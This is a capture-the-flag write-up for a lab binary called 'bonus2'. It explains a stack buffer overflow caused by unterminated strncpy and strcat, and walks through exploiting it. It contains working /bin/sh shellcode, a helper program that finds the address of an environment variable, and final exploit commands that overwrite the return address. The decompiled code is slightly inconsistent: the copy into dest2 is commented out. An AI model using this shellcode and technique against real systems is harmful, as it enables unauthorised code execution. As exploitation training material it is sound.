# Bonus2

## Code

```
int language = 0;

void    greetuser(char *src)
{
  char dest[64];

  switch ( language )
  {
    case 1:
      strcpy(dest, "Hyvää päivää ");
      break;
    case 2:
      strcpy(dest, "Goedemiddag! ");
      break;
    case 0:
      strcpy(dest, "Hello ");
      break;
  }
  strcat(dest, src);
  puts(dest);
}

int main(int argc, char *argv[])
{
  char dest2[76];
  char *env_LANG = NULL;
  char dest[64];

  if ( argc != 3 )
    return 1;
  memset(dest, 0, 76);
  strncpy(dest, argv[1], 40);
  strncpy(dest + 40, argv[2], 32);
  env_LANG = getenv("LANG");
  if ( env_LANG )
  {
    if ( !memcmp(env_LANG, "fi", 2) )
    {
      language = 1;
    }
    else if ( !memcmp(env_LANG, "nl", 2) )
    {
      language = 2;
    }
  }
  //memcpy(dest2, dest, sizeof(dest2));
  greetuser(dest2);
  return (0);
}
```

## Explanation


- This program takes 2 arguments and greets the user saying : "Hello <argv[1]". If argv[1] is 
    more than 40 bytes long, the program will concatenate argv[2] as an extension of the name

- Again, the strncpy() calls are not protected, so if both argv[1] is over 40 bytes and argv[2]
    is more than 32 bytes, the final string will not be null terminated, which means we can
    overflow the buffer to overwrite the return address.

- So we created an env variable just like in bonus0 to put our shellcode:

    export EXPLOIT=`python -c 'print "\x90" * 50 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`

- In the same way, we reused the same short program to print the address of the string so we can
    use it to replace the return address :

    #include <stdio.h>
    #include <stdlib.h>

    int main()
    {
        printf("%p\n", getenv("EXPLOIT"));
        return 0;
    }

- This program gave us the address 0xbffff8ef

- Using the same technique as bonus0, we managed to find the offset of the return address by
    using gdb and giving the program strings like "ABCDEFGHIJKLMNOP.......", which allowed
    us to see that if we overflow the first argument, we could reach the return address
    to overwrite at the 31st-34th bytes of the second argument, so we first tried this:

    ./bonus2 "$(python -c "print 'A' * 45")" "$(python -c "print 'A' * 30 + '\xf3\xf8\xff\xbf'")"

- Which created a very nice segfault : Since the strncpy of the second arg is on 32 bytes,
    we only copied the first 2 bytes of our env variable's address without changing the
    other 2 bytes that followed, which made the program try to  jump to a bad address.

- Looking closer at the decompiled version of the program, we saw that it called getenv()
    to try to get a LANG variable, and display its "Hello" message in different languages,
    namely finnish or dutch.

- So we ran gdb again after having done :
    export LANG=nl    or    export LANG=fi

- We noticed that the offset of the return address in the second string was smaller
    with the program set to another language: 19 for "fi" and 24 for "nl". So both leave
    us enough space to put our four bytes of address before the 32 bytes threshold.

- All that was left to do was do adapt our payload to this offset and run it again, for
    instance with the case LANG=fi :

## Exploit
```
$    ./bonus2 "$(python -c "print 'A' * 45")" "$(python -c "print 'A' * 18 + '\xf3\xf8\xff\xbf'")" 
```